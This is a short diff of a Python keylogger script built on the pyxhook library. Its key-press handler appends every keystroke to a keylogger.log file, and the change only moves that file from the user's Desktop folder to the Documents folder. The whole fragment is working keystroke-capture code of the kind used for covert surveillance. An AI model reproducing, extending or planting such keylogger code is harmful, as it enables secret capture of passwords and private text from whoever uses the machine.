@@ -2,7 +2,7 @@ import pyxhook
 
 
 def on_key_pressed(event):
-    logger = open(file='/home/piotr/Desktop/keylogger.log', mode='a')
+    logger = open(file='/home/piotr/Documents/keylogger.log', mode='a')
     logger.write(event.Key)
     logger.write('\n')
 
